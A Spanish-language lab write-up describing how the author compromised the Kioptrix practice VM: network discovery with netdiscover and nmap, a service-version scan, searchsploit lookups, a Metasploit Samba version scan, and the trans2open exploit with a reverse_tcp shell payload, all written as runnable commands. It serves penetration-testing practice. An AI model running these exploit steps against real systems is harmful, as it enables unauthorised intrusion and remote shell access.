# Cómo he vulnerando la máquina Kioptix 

### Primero hice un reconicimiento de la red en busca de la IP de la máquina virtual (siendo que únicamente conozco la MAC y la red padre):

sudo netdiscover

nmap -sn 10.0.0.0/19

### Obtengo la IP de la máquina a atacar:

10.0.4.10

### Seguidamente hice un nmap -sV en busqueda de puertos abiertos junto al servicio que usa y su versión:

```ismael@ismael-VirtualBox:~$ nmap -sV 10.0.4.10
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-17 16:46 CET
Nmap scan report for 10.0.4.10
Host is up (0.00057s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```

### Analizo con metasploit los servicios de la máquina atacada (solo mostraré los outputs más interesantes)
```
searchsploit OpenSSH 2.9p2

OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                       | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                         | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                               | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                 | linux/local/40962.txt
```
```
searchsploit Apache 1.3.20

pache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                    | php/remote/29316.py
Apache 1.3.20 (Win32) - 'PHP.exe' Remote File Disclosure                                                                                             | windows/remote/21204.txt
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 - Root Directory Access                                                                                      | windows/remote/19975.pl
```
```
searchsploit rcp
```

### Ya que nmap no nos ha dado la versión de samba la busqué yo mismo utilizando un scanner de versiones de samba:
```
msfconsole
search scanner/smb
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 10.0.4.10
run
```

### Obtuve de resultado que se está usando la version de samba 2.2.1a, aunque buscando directamente en metasploit no existe una vulnerabilidad para esta versión, por lo que busqué para la versión 2.2 y encontré este que me da una reverse shell: exploit/linux/samba/trans2open , y usé la payload payload/linux/x86/shell/reverse_tcp:
```
search samba 2.2
use exploit/linux/samba/trans2open
show payloads
set PAYLOAD payload/linux/x86/shell/reverse_tcp
set RHOSTS 10.0.4.10
run
```

### (La demonstración de que realmente obtuve acceso a la máquina está junto a este fichero)